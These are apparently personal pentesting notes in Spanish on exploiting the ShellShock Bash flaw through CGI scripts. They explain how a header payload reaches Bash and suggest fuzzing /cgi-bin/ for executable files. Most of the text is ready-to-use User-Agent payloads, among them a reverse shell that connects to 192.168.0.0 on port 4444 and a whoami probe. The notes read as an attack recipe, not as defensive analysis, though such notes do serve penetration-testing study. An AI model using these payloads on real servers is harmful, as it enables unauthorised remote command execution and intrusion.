#Inyeccion 
https://blog.cloudflare.com/inside-shellshock/
Normalmente si se encuentra un archivo /cgi-bin/ puede ser factible testear ataques ShellShock.

----
ShellShock explota así:

1. Envías un **header HTTP** con el payload.
2. El servidor lo convierte en **variable de entorno** para un script CGI.
3. Bash interpreta esa variable → **RCE**.
    
Da igual cuál header uses: User-Agent, Cookie, Referer, Host, etc.  
Pero **siempre es en un header**, porque es lo que termina como variable de entorno.

---
Si se encuentra el endpoint _/cgi-bin/_, se deberia probar por fuzzear directorios con extensiones ejecutables (_.cgi_,_.sh_,_.php_,_.py_, etc)

---
El header HTTP puede ser el siguiente:

```
User-Agent:"() { :; }; /bin/bash -c 'bin/bash -i >& /dev/tcp/192.168.0.0/4444 0>&1'"
```
o
```
User-Agent:"() { :; }; which whoami"
```

Si no vemos la respuesta del lado del servidor podemos hacer el siguiente payload:

```
User-Agent:"() { :; }; echo; /usr/bin/whoami"
```